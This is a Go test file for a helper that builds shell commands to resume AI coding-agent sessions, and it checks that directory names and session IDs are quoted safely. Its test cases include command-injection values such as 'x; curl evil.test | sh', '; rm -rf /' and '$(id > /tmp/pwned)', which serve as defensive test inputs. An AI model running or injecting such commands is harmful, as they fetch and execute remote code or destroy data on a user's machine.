package resumecmd

import (
	"reflect"
	"strings"
	"testing"
)

func strptr(s string) *string { return &s }

func TestBuild(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name      string
		agent     string
		sourceID  string
		cwd       *string
		skipPerms bool
		wantOK    bool
		wantSpec  Spec
	}{
		{
			name:     "claude-code with cwd",
			agent:    "claude-code",
			sourceID: "5c407125-a64a-46c1-96d5-65ca14bdd9fc",
			cwd:      strptr("/home/tom/devel/foo"),
			wantOK:   true,
			wantSpec: Spec{Cwd: "/home/tom/devel/foo", Bin: "claude", Args: []string{"--resume", "5c407125-a64a-46c1-96d5-65ca14bdd9fc"}},
		},
		{
			name:     "claude-code without cwd",
			agent:    "claude-code",
			sourceID: "abc",
			cwd:      nil,
			wantOK:   true,
			wantSpec: Spec{Cwd: "", Bin: "claude", Args: []string{"--resume", "abc"}},
		},
		{
			name:     "claude-code empty-but-non-nil cwd drops the cd",
			agent:    "claude-code",
			sourceID: "abc",
			cwd:      strptr(""),
			wantOK:   true,
			wantSpec: Spec{Cwd: "", Bin: "claude", Args: []string{"--resume", "abc"}},
		},
		{
			name:      "claude-code skip perms appends the flag",
			agent:     "claude-code",
			sourceID:  "abc",
			cwd:       strptr("/x"),
			skipPerms: true,
			wantOK:    true,
			wantSpec:  Spec{Cwd: "/x", Bin: "claude", Args: []string{"--resume", "abc", "--dangerously-skip-permissions"}},
		},
		{
			name:     "gemini-cli with cwd",
			agent:    "gemini-cli",
			sourceID: "9a640b1c-eefa-40ef-897a-0437f0931706",
			cwd:      strptr("/home/tom/devel/aichronicles"),
			wantOK:   true,
			wantSpec: Spec{Cwd: "/home/tom/devel/aichronicles", Bin: "gemini", Args: []string{"--resume", "9a640b1c-eefa-40ef-897a-0437f0931706"}},
		},
		{
			name:      "gemini-cli skip perms is unsupported",
			agent:     "gemini-cli",
			sourceID:  "abc",
			cwd:       strptr("/x"),
			skipPerms: true,
			wantOK:    false,
		},
		{
			name:     "unknown agent yields not-ok",
			agent:    "some-future-agent",
			sourceID: "abc",
			cwd:      strptr("/x"),
			wantOK:   false,
		},
		{
			name:     "missing source id yields not-ok",
			agent:    "claude-code",
			sourceID: "",
			cwd:      strptr("/x"),
			wantOK:   false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			spec, ok := Build(tc.agent, tc.sourceID, tc.cwd, tc.skipPerms)
			if ok != tc.wantOK {
				t.Fatalf("ok: got %v, want %v", ok, tc.wantOK)
			}
			if !ok {
				return
			}
			if !reflect.DeepEqual(spec, tc.wantSpec) {
				t.Errorf("spec:\n got %#v\nwant %#v", spec, tc.wantSpec)
			}
		})
	}
}

func TestSpecShell(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		spec Spec
		want string
	}{
		{
			name: "with cwd",
			spec: Spec{Cwd: "/home/tom/devel/foo", Bin: "claude", Args: []string{"--resume", "abc"}},
			want: "cd /home/tom/devel/foo && claude --resume abc",
		},
		{
			name: "without cwd",
			spec: Spec{Bin: "claude", Args: []string{"--resume", "abc"}},
			want: "claude --resume abc",
		},
		{
			name: "dangerous flag",
			spec: Spec{Cwd: "/x", Bin: "claude", Args: []string{"--resume", "abc", "--dangerously-skip-permissions"}},
			want: "cd /x && claude --resume abc --dangerously-skip-permissions",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if got := tc.spec.Shell(); got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

// TestShell_QuotesUntrustedValues covers the one place in the resume
// path where the trust boundary changes.
//
// Bin and Args go to syscall.Exec as a structured argv, where quoting
// would be wrong. The same fields go through Shell() into a string
// the user pastes into a terminal, where its absence is: `resume
// --print` emits it and the web Resume button copies it to the
// clipboard verbatim.
//
// The everyday failure needs no attacker — a directory with a space
// splits into two words and runs the tail as a command. cwd comes
// straight from the hook payload and is never validated, and
// Envelope.Validate only requires source_session_id to be non-empty.
func TestShell_QuotesUntrustedValues(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		spec Spec
		want string
	}{
		{
			name: "plain values stay readable",
			spec: Spec{Cwd: "/home/u/proj", Bin: "claude", Args: []string{"--resume", "abc-123"}},
			want: "cd /home/u/proj && claude --resume abc-123",
		},
		{
			name: "space in cwd",
			spec: Spec{Cwd: "/home/u/My Projects/api", Bin: "claude", Args: []string{"--resume", "x"}},
			want: "cd '/home/u/My Projects/api' && claude --resume x",
		},
		{
			name: "command substitution in cwd",
			spec: Spec{Cwd: "/home/u/$(id > /tmp/pwned)", Bin: "claude", Args: []string{"--resume", "x"}},
			want: `cd '/home/u/$(id > /tmp/pwned)' && claude --resume x`,
		},
		{
			name: "semicolon injection in session id",
			spec: Spec{Cwd: "/w", Bin: "claude", Args: []string{"--resume", "x; curl evil.test | sh"}},
			want: `cd /w && claude --resume 'x; curl evil.test | sh'`,
		},
		{
			name: "embedded single quote",
			spec: Spec{Cwd: "/w/it's", Bin: "claude", Args: []string{"--resume", "x"}},
			want: `cd '/w/it'\''s' && claude --resume x`,
		},
		{
			name: "no cwd",
			spec: Spec{Bin: "gemini", Args: []string{"--resume", "y"}},
			want: "gemini --resume y",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if got := tc.spec.Shell(); got != tc.want {
				t.Errorf("Shell()\n got: %s\nwant: %s", got, tc.want)
			}
		})
	}
}

// TestShell_MetacharactersNeverEscapeQuoting is the property behind
// the table: whatever the input, no shell metacharacter may appear
// outside single quotes.
func TestShell_MetacharactersNeverEscapeQuoting(t *testing.T) {
	t.Parallel()
	for _, hostile := range []string{
		"; rm -rf /", "$(whoami)", "`id`", "| sh", "&& curl x", "\nrm -rf /",
		"a'b", "$HOME", "*", "~", ">out",
	} {
		line := Spec{Cwd: "/w" + hostile, Bin: "claude", Args: []string{"--resume", hostile}}.Shell()
		// Strip every single-quoted run; whatever remains is the
		// unquoted portion and must be inert.
		var outside strings.Builder
		inQuote := false
		for _, r := range line {
			if r == '\'' {
				inQuote = !inQuote
				continue
			}
			if !inQuote {
				outside.WriteRune(r)
			}
		}
		for _, bad := range []string{";", "|", "`", "$", "\n", "*", "~", ">"} {
			if strings.Contains(outside.String(), bad) {
				t.Errorf("metacharacter %q left unquoted for input %q\n line: %s\noutside quotes: %q",
					bad, hostile, line, outside.String())
			}
		}
	}
}
